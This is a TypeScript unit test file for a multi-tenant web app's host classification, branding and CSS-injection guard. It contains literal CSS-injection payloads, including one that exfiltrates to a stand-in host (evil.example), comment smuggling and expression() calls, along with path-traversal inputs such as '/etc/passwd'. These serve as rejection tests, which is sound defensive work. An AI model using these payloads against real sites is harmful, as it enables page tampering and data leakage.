/**
 * Unit tests for the Phase 3 pure logic. No database, no network.
 *
 * These cover the two functions where a quiet mistake has the widest blast
 * radius:
 *
 *   classifyHost  decides WHICH TENANT a request is for. Misread a host as
 *                 "apex" and you serve Prime PEO's own book to whoever asked;
 *                 misread the apex as a partner and multi-tenancy silently
 *                 stops working.
 *
 *   safeColor     is a CSS-injection boundary. Its output is interpolated into
 *                 `<style>{":root{...}"}</style>`, where React escapes `<` but
 *                 NOT `}` or `;`, because the content of a <style> element is
 *                 CSS rather than HTML.
 *
 * Run: npx tsx scripts/test-unit.mts
 */
import { describe, ok, equal, done } from "./lib/harness";
import { classifyHost, APEX_HOST } from "../lib/tenant/host";
import {
  parseBranding,
  brandingToCss,
  contrastRatio,
  logoUrl,
  __testables,
} from "../lib/tenant/branding";
import {
  slugifyStage,
  validateStageLabel,
  stageTone,
  defaultStage,
  selectableStages,
  PROTECTED_STAGE_SLUG,
  toStage,
  type Stage,
} from "../lib/console/stages";

const { safeColor, safePath, safeText, safeInt } = __testables;
const apex = APEX_HOST.split(":")[0]!;

// ===========================================================================
describe("classifyHost: hosts that must resolve to the HOUSE tenant");
// ===========================================================================
for (const h of [apex, `${apex}:3000`, `www.${apex}`, `WWW.${apex.toUpperCase()}`]) {
  equal(classifyHost(h).kind, "apex", `"${h}"`);
}
// Vercel-assigned hosts serve the house site. Without this a preview URL is
// read as a request for the tenant "prime-vintage-git-main-abc123".
for (const h of ["prime-vintage.vercel.app", "x-git-main-abc.vercel.app", "vercel.app"]) {
  equal(classifyHost(h).kind, "apex", `"${h}" (Vercel-assigned)`);
}
// Reserved labels are infrastructure. A tenant must never be able to claim a
// slug that shadows them, and tenants.slug alone cannot express that.
for (const label of ["www", "api", "admin", "console", "portal", "assets", "cdn", "staging", "mail"]) {
  equal(classifyHost(`${label}.${apex}`).kind, "apex", `"${label}." is reserved`);
}

// ===========================================================================
describe("classifyHost: hosts that must resolve to a PARTNER");
// ===========================================================================
const partners: [string, string][] = [
  [`acme.${apex}`, "acme"],
  [`acme.${apex}:3000`, "acme"],
  [`ACME.${apex}`, "acme"],
  [`  acme.${apex}  `, "acme"],
  [`a-b-c.${apex}`, "a-b-c"],
  [`p1.${apex}`, "p1"],
  [`ab.${apex}`, "ab"],
  [`${"a".repeat(63)}.${apex}`, "a".repeat(63)],
];
for (const [host, slug] of partners) {
  const r = classifyHost(host);
  ok(r.kind === "partner" && r.slug === slug, `"${host}" -> ${slug}`,
     r.kind === "partner" ? undefined : `got ${JSON.stringify(r)}`);
}

// ===========================================================================
describe("classifyHost: hosts that must be UNKNOWN, never a silent fallback");
// ===========================================================================
/*
  "unknown" has to be distinct from "apex". A typo'd or spoofed Host that fell
  back to the house tenant would serve the client's own leads to whoever sent
  it, so absence of a match must mean 404, not "default".
*/
for (const h of [null, undefined, "", "   ", ":3000"]) {
  equal(classifyHost(h as string).kind, "unknown", `${JSON.stringify(h)} (empty)`);
}
for (const h of ["evil.com", `acme.${apex}.evil.com`, "notourdomain.co.uk"]) {
  equal(classifyHost(h).kind, "unknown", `"${h}" (not our domain)`);
}
// Two labels deep: a wildcard TLS cert does not cover it, so treating it as a
// partner would promise what the certificate cannot deliver.
equal(classifyHost(`a.b.${apex}`).kind, "unknown", `"a.b.${apex}" (two labels)`);
// Below or above what tenants.slug can hold.
equal(classifyHost(`x.${apex}`).kind, "unknown", `1-char label (DB minimum is 2)`);
equal(classifyHost(`${"a".repeat(64)}.${apex}`).kind, "unknown", `64-char label (DNS max is 63)`);
for (const bad of ["under_score", "Ünicode", "-", "has space", "dot.dot"]) {
  equal(classifyHost(`${bad}.${apex}`).kind, "unknown", `"${bad}" is not a legal slug`);
}

// ===========================================================================
describe("safeColor: the CSS-injection boundary");
// ===========================================================================
for (const good of ["#fff", "#FFF", "#ff2d00", "#19233bff", " #fff "]) {
  ok(safeColor(good) !== undefined, `accepts ${JSON.stringify(good)}`);
}
equal(safeColor("#FF2D00"), "#ff2d00", "normalises case");

/*
  Every entry below is a working payload if the allowlist is relaxed. They are
  kept as literals rather than generated, so the file itself documents what is
  being defended against.
*/
const payloads: [unknown, string][] = [
  ["red}body{display:none}", "closes the rule and opens another"],
  ["#fff}html{opacity:0}", "hides the page"],
  ["red;background-image:url(https://evil.example/?c=1)", "exfiltrates on paint"],
  ["#fff;position:fixed", "appends a declaration"],
  ["url(https://evil.example)", "remote fetch"],
  ["rgb(255,0,0)", "parenthesised function"],
  ["oklch(0.7 0.1 20)", "parenthesised function"],
  ["var(--pv-ink)", "indirection"],
  ["expression(alert(1))", "legacy IE expression"],
  ["#fff/**/;x:y", "comment smuggling"],
  ["#gggggg", "non-hex digits"],
  ["#ff", "too short"],
  ["#ff2d0", "5 digits"],
  ["fff", "missing #"],
  ["transparent", "keyword"],
  ["currentColor", "keyword"],
  ["inherit", "keyword"],
  ["", "empty"],
  [null, "null"],
  [undefined, "undefined"],
  [123, "number"],
  [{}, "object"],
  [[], "array"],
];
for (const [payload, why] of payloads) {
  equal(safeColor(payload), undefined, `rejects ${JSON.stringify(payload)} (${why})`);
}

// ===========================================================================
describe("brandingToCss: output is structurally safe, whatever went in");
// ===========================================================================
/*
  Asserted as a PROPERTY of the output rather than by trusting safeColor: every
  emitted declaration must be one of ours, with a value that is a hex or a
  color-mix over a hex. This holds even if the regex is later weakened.
*/
const hostile = parseBranding(
  {
    companyName: "Acme",
    colors: {
      accent: "red}body{display:none}",
      ink: "#123456",
      dark: "url(https://evil.example)",
      accentPress: "#fff;x:y",
    },
  },
  "Fallback",
);
const css = brandingToCss(hostile);
ok(!css.includes("}"), "emits no closing brace");
ok(!css.includes("url("), "emits no url(");
ok(!css.includes("red"), "drops the rejected accent");
ok(!css.includes("evil"), "drops the rejected dark colour");
ok(css.includes("--pv-ink:#123456"), "keeps the one valid colour");
const SAFE_DECL =
  /^--pv-[a-z-]+:(#[0-9a-f]{3,8}|color-mix\(in oklab,#[0-9a-f]{3,8} \d+%,(white|black)\))$/;
for (const decl of css.split(";")) {
  ok(SAFE_DECL.test(decl), `declaration is a safe --pv-* value: ${JSON.stringify(decl)}`);
}

// An unbranded tenant must emit NOTHING, so the house palette stands rather
// than being overridden with empty values.
equal(brandingToCss(parseBranding({}, "Acme")), "", "unbranded tenant emits no CSS");
equal(brandingToCss(parseBranding({ colors: {} }, "Acme")), "", "colors:{} emits no CSS");
// Derived greys follow the ink, so a partner sets one colour and the family
// relationship in the brand guide survives.
const inked = brandingToCss(parseBranding({ colors: { ink: "#101820" } }, "A"));
ok(inked.includes("--pv-ink-soft:color-mix"), "derives ink-soft from ink");
ok(inked.includes("--pv-ink-muted:color-mix"), "derives ink-muted from ink");

// ===========================================================================
describe("parseBranding: coerces, never throws");
// ===========================================================================
/*
  A thrown error here would 500 a partner's whole portal over one bad field, so
  every input must degrade to the house default instead.
*/
for (const raw of [null, undefined, [], 42, "nope", true, {}, { colors: "red" }, { logo: 7 }]) {
  let threw = false;
  let name = "";
  try {
    name = parseBranding(raw, "House Co").companyName ?? "";
  } catch {
    threw = true;
  }
  ok(!threw && name === "House Co",
     `${JSON.stringify(raw)} degrades to the tenant name`,
     threw ? "it threw" : `companyName was ${JSON.stringify(name)}`);
}
equal(parseBranding({}, "Acme Brokers").companyName, "Acme Brokers",
      "an unbranded tenant renders its own name, not the house brand");
equal(parseBranding({ companyName: "  Acme  " }, "X").companyName, "Acme", "trims");
equal(parseBranding({ companyName: "a".repeat(200) }, "X").companyName, "X",
      "over-long name falls back rather than breaking the header");
equal(parseBranding({ supportEmail: "not-an-email" }, "X").supportEmail, undefined,
      "rejects a malformed support email");
equal(parseBranding({ supportEmail: "ops@acme.com" }, "X").supportEmail, "ops@acme.com",
      "keeps a valid support email");

// ===========================================================================
describe("logo: all three dimensions or none, and no third-party origins");
// ===========================================================================
equal(parseBranding({ logo: { path: "a/b.png" } }, "X").logo, undefined,
      "a logo without width/height is dropped (it would shift the header)");
equal(parseBranding({ logo: { path: "a/b.png", width: 200, height: 40 } }, "X").logo?.path,
      "a/b.png", "a complete logo survives");
equal(parseBranding({ logo: { path: "a/b.png", width: 200, height: 40, displayHeight: 999 } }, "X")
        .logo?.displayHeight, undefined, "an out-of-range displayHeight is dropped");
/*
  safePath is why branding.logo.path is a BUCKET PATH and not a URL: a branding
  row must not be able to point a partner's header at an origin the client does
  not control.
*/
for (const bad of [
  "https://evil.example/logo.png",
  "//evil.example/logo.png",
  "/etc/passwd",
  "../../secret.png",
  "a/../../b.png",
  "data:image/svg+xml;base64,AAAA",
]) {
  equal(safePath(bad), undefined, `safePath rejects ${JSON.stringify(bad)}`);
}
equal(safePath("tenants/acme/logo.png"), "tenants/acme/logo.png", "accepts a plain bucket path");
ok(logoUrl("tenants/acme/logo.png").includes("/storage/v1/object/public/tenant-logos/"),
   "logoUrl resolves a bucket path against the public storage endpoint");

// ===========================================================================
describe("safeText / safeInt bounds");
// ===========================================================================
equal(safeText("  hi  ", 10), "hi", "safeText trims");
equal(safeText("", 10), undefined, "safeText rejects empty");
equal(safeText("abc", 2), undefined, "safeText enforces max length");
equal(safeText(42, 10), undefined, "safeText rejects a non-string");
equal(safeInt(20, 16, 48), 20, "safeInt accepts in range");
equal(safeInt(15, 16, 48), undefined, "safeInt rejects below min");
equal(safeInt(49, 16, 48), undefined, "safeInt rejects above max");
equal(safeInt(Number.NaN, 16, 48), undefined, "safeInt rejects NaN");
equal(safeInt(Infinity, 16, 48), undefined, "safeInt rejects Infinity");
equal(safeInt("20", 16, 48), 20, "safeInt coerces a numeric string");

// ===========================================================================
describe("contrastRatio: the branding form's accessibility gate");
// ===========================================================================
equal(Math.round(contrastRatio("#ffffff", "#000000")), 21, "black on white is 21:1");
equal(contrastRatio("#ffffff", "#ffffff"), 1, "a colour against itself is 1:1");
ok(Math.abs(contrastRatio("#000", "#fff") - contrastRatio("#fff", "#000")) < 1e-9,
   "is symmetric");
// globals.css documents the house orange as failing AA for body text, which is
// why it is restricted to large text and the mark. A partner should be held to
// at least the same standard.
const orange = contrastRatio("#ff2d00", "#ffffff");
ok(orange > 3 && orange < 4.5,
   `the house orange sits between 3:1 and 4.5:1 on white (${orange.toFixed(2)})`);
ok(contrastRatio("#19233b", "#ffffff") > 4.5, "navy on white passes AA");
// A pale accent is exactly the palette the form must refuse.
ok(contrastRatio("#ffe9a8", "#ffffff") < 3, "a pale yellow accent is under 3:1 and must be refused");

// ===========================================================================
describe("stage helpers (Phase 2, re-checked because Phase 3 seeds them per tenant)");
// ===========================================================================
/*
  provision-tenant.mts seeds these four slugs for every new partner, and
  submissions_default_stage() raises if a tenant has none. So the slug rules
  are now load-bearing for partner onboarding, not just the admin screen.
*/
equal(slugifyStage("In Progress"), "in-progress", "slugify lowercases and hyphenates");
equal(slugifyStage("  Closed  "), "closed", "slugify trims");
equal(PROTECTED_STAGE_SLUG, "new",
      "the protected slug is 'new', matching the 0001 column default");
/*
  Built through toStage() from the raw DB row shape rather than hand-written as
  Stage objects. That way this fixture also exercises the row -> Stage mapping
  the server actually performs, so a column rename in a migration surfaces here
  rather than at runtime.
*/
const stages: Stage[] = [
  { id: "1", slug: "new", label: "New", sort_order: 10, is_default: true, is_terminal: false, tone: "neutral", retired_at: null },
  { id: "2", slug: "closed", label: "Closed", sort_order: 40, is_default: false, is_terminal: true, tone: "positive", retired_at: null },
  { id: "3", slug: "old", label: "Old", sort_order: 50, is_default: false, is_terminal: false, tone: "neutral", retired_at: "2026-01-01T00:00:00Z" },
].map(toStage);

equal(stages[0]!.isDefault, true, "toStage maps is_default -> isDefault");
equal(stages[2]!.retired, true, "toStage maps a non-null retired_at -> retired");
equal(defaultStage(stages)?.slug, "new", "defaultStage finds the default stage");
equal(selectableStages(stages).length, 2, "selectableStages excludes the retired stage");
ok(stageTone("nonexistent", stages) !== undefined,
   "an unknown slug still yields a Badge variant rather than an unstyled badge");

// validateStageLabel returns a message string, or "" when the label is fine.
ok(validateStageLabel("New", stages) !== "", "a duplicate stage label is rejected");
equal(validateStageLabel("Qualified", stages), "", "a fresh stage label is accepted");
ok(validateStageLabel("", stages) !== "", "an empty stage label is rejected");
ok(validateStageLabel("x".repeat(61), stages) !== "", "an over-long stage label is rejected");
// A rename must not collide with itself.
equal(validateStageLabel("New", stages, { ignoreId: "1" }), "",
      "renaming a stage to its own current label is allowed");

done("test-unit");
